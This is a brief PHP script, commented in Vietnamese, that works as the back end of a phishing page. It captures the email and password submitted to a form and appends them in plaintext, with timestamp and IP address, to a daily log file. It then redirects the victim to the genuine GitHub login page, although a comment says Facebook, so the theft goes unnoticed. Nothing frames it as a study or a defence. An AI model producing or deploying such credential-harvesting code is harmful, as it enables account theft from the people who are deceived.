<?php
// Đường dẫn tới thư mục lưu trữ dữ liệu
$dataDir = __DIR__ . '/user_data';

// Kiểm tra thư mục, nếu chưa tồn tại thì tạo mới
if (!file_exists($dataDir)) {
    mkdir($dataDir, 0755, true);
}

// Lấy thông tin từ form
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if ($email && $password) {
    // Tạo chuỗi dữ liệu để lưu
    $userInfo = "Email: $email\nPassword: $password\nTimestamp: " . date('c') . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n--------------------\n";

    // Lấy ngày hiện tại để đặt tên file
    $currentDate = date('Y-m-d'); // Định dạng: 2024-11-21
    $filePath = $dataDir . "/$currentDate.txt";

    // Ghi dữ liệu vào file (thêm vào cuối file nếu đã tồn tại)
    file_put_contents($filePath, $userInfo, FILE_APPEND);

    // Chuyển hướng về Facebook
    header('Location: https://github.com/login');
    exit();
} else {
    echo 'Thiếu thông tin đăng nhập.';
}
?>
